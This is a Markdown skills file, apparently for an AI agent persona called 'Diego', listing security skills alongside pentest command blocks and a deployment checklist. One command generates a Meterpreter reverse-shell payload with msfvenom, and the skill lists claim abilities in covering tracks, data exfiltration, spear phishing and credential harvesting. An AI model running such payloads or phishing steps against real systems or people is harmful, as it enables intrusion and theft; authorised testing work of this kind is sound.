# SKILLS.md - Diego Security Skills

## Security Fundamentals
- [x] OWASP Top 10 (2017, 2021)
- [x] SANS Top 25
- [x] CIA Triad (Confidentiality, Integrity, Availability)
- [x] Defense in Depth
- [x] Least Privilege
- [x] Zero Trust Architecture

## Web Application Security
- [x] SQL Injection detection & prevention
- [x] XSS (Stored, Reflected, DOM-based)
- [x] CSRF prevention
- [x] SSRF protection
- [x] Authentication flaws
- [x] Authorization bypass
- [x] File inclusion vulnerabilities
- [x] XML External Entities (XXE)

## API Security
- [x] JWT security (alg none, kid injection)
- [x] OAuth 2.0 security
- [x] API rate limiting
- [x] Mass assignment
- [x] Input validation
- [x] GraphQL security

## Network Security
- [x] Firewall configuration (UFW, iptables)
- [x] VPN setup & management
- [x] SSL/TLS configuration
- [x] Port scanning (nmap)
- [x] Network segmentation
- [x] DNS security (DNSSEC)

## Security Tools
- [x] OWASP ZAP (automated scanner) - `zap-cli`
- [x] Burp Suite (proxy, repeater, intruder)
- [x] Nmap (network discovery, vulnerability scan)
- [x] Wireshark (packet analysis)
- [x] Metasploit Framework (penetration testing) - *knowledge only*
- [x] Nuclei (vulnerability scanner)
- [x] SQLmap (SQL injection detection)
- [x] Nikto (web server scanner)
- [x] Gobuster (directory/file busting)
- [x] Dirb (web content scanner)
- [x] WhatWeb (web technology fingerprinting)
- [x] OWASP Amass (attack surface mapping)
- [x] XSStrike (XSS vulnerability scanner)
- [x] Wapiti (web vulnerability scanner)
- [x] FFuf (web fuzzing)
- [x] Commix (command injection)
- [x] SearchSploit / ExploitDB (exploit search)
- [x] CVE Online (cve.mitre.org)

## DevSecOps
- [x] Security in CI/CD
- [x] SAST (Static Analysis)
- [x] DAST (Dynamic Analysis)
- [x] Container security (Docker scanning)
- [x] Dependency vulnerability scanning (npm audit)
- [x] Secret scanning

## Incident Response
- [x] Log analysis
- [x] Threat hunting
- [x] Digital forensics basics
- [x] Malware analysis basics
- [x] SIEM basics

## AI-Powered Security (METATRON-style)
- [x] Ollama local LLM integration for security analysis
- [x] Automated recon with AI interpretation
- [x] CVE lookup with DuckDuckGo
- [x] Metasploit framework integration

## Advanced Pentesting Commands
```bash
# Full vulnerability scan with AI analysis
nmap -sV --script=vuln localhost | ollama analyze

# SQL Injection test with sqlmap
sqlmap -u "TARGET_URL" --batch --risk=3 --level=5

# Nikto scan + AI analysis
nikto -h TARGET_URL | ollama "analyze security findings"

# Metasploit Framework
msfconsole -q -x "use auxiliary/scanner/http/http_version; run"
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf

# XSStrike XSS scan
xsstrike -u "http://TARGET/param"

# Wapiti web vulnerability scan
wapiti -u http://TARGET --scope domain

# FFuf web fuzzing
ffuf -w wordlist.txt -u http://TARGET/FUZZ

# OWASP ZAP scan
zap-cli quick-scan http://TARGET

# Commix command injection
commix -u "http://TARGET/param?cmd=id"

# SearchSploit - search exploits
searchsploit "apache 2.4"
searchsploit -m 12345.c

# Nmap full scan with scripts
nmap -sV -sC -p- --script=vuln TARGET

# Privilege escalation check
linPEAS.sh or winPEAS.exe
```

## Web Application Testing
- [x] SQL Injection (Error-based, Blind, Time-based, Union-based)
- [x] Cross-Site Scripting (Reflected, Stored, DOM-based)
- [x] Command Injection (OS Command Injection)
- [x] Path Traversal / Local File Inclusion
- [x] Server-Side Request Forgery (SSRF)
- [x] XML External Entities (XXE)
- [x] Insecure Direct Object Reference (IDOR)
- [x] Business Logic Vulnerabilities
- [x] JWT Token Attacks
- [x] API Security Testing
- [x] Server-Side Template Injection (SSTI)
- [x] Web Cache Deception
- [x] HTTP Desync / Request Smuggling
- [x] GraphQL Security

## Privilege Escalation
- [x] Linux privilege escalation (SUID, sudo, cron)
- [x] Windows privilege escalation
- [x] Kernel exploits
- [x] Service misconfigurations
- [x] Credential reuse

## Post-Exploitation
- [x] Lateral movement techniques
- [x] Persistence mechanisms
- [x] Data exfiltration
- [x] Covering tracks

## Metasploit Framework (Conceptual)
- [x] msfconsole basics
- [x] Module types (exploit, auxiliary, payload, encoder, post)
- [x] Search and select modules
- [x] auxiliary/scanner modules
- [x] exploit modules
- [x] Payload generation with msfvenom
- [x] Meterpreter sessions
- [x] post modules
- [x] Pivoting and tunnel creation
- [x] Privilege escalation with getsystem
- [x] Hash dumping and credential reuse
- [x] Persistence with run persistence

## Scheduled Scans
- [x] cron job configuration
- [x] nuclei templates scheduling
- [x] nikto auto-run
- [x] Security report scheduling
- [x] Alert integration
- [x] Quarterly audits

## Social Engineering
- [x] Spear phishing campaigns
- [x] Credential harvesting
- [x] Pretexting
- [x] Baiting and quizz pro
- [x] USB drop attacks
- [x] Identity impersonation
- [x] Vishing / Voice phishing

## CVE & Threat Intelligence
- [x] CVE database search (cve.mitre.org)
- [x] NVD (National Vulnerability Database)
- [x] Exploit-DB integration
- [x] Rapid7 Vulnerability Database
- [x] NIST NVD API integration
- [x] threat情报 feeds
- [x] Zero-day tracking

## Monitoring & SIEM
- [x] Log analysis (syslog, Apache, Nginx)
- [x] IDS/IPS configuration (Snort, Suricata)
- [x] SIEM basics (ELK Stack, Splunk)
- [x] Alert thresholds
- [x] Incident detection
- [x] Real-time monitoring
- [x] Security dashboards

## Automated Reporting
- [x] PDF report generation
- [x] Executive summary format
- [x] Technical detail levels
- [x] Remediation tracking
- [x] Compliance mapping (OWASP, NIST, ISO 27001)
- [x] Scheduled reports
- [x] CVSS scoring

## Cloud Security (Bonus)
- [x] AWS security best practices
- [x] IAM auditing
- [x] S3 bucket misconfigurations
- [x] CloudTrail analysis

## Compliance
- [x] GDPR security requirements
- [x] PCI-DSS basics
- [x] ISO 27001 basics

## Commands

```bash
# Run ZAP scan
zap-cli quickurls http://localhost:3001/api

# Security headers check
curl -I http://localhost:3001/api/health

# Nmap scan
nmap -sV -sC localhost
nmap -p 1-1000 localhost

# Nikto web server scan
nikto -h http://localhost:3001

# SQLmap test (SAFE - local only)
sqlmap -u "http://localhost:3001/api/login" --batch

# Gobuster directory busting
gobuster dir -u http://localhost:3001 -w /usr/share/wordlists/dirb/common.txt

# Dirb web content scan
dirb http://localhost:3001 /usr/share/dirb/wordlists/common.txt

# WhatWeb technology fingerprint
whatweb http://localhost:3001

# npm audit
cd /home/jarvis/dept-dev/backend && npm audit

# Check open ports
ss -tulpn | grep LISTEN
```

## Security Checklist for Deploy

- [ ] HTTPS enabled with valid cert
- [ ] Security headers configured (Helmet)
- [ ] CORS restricted to allowed origins
- [ ] Rate limiting enabled
- [ ] JWT expiration set (< 1 hour)
- [ ] Passwords hashed with bcrypt (cost 12)
- [ ] Input validation on all endpoints
- [ ] SQL injection prevention (parameterized queries)
- [ ] Logs configured (no sensitive data)
- [ ] Environment variables secured
- [ ] Dependencies audited
- [ ] Docker containers scanned
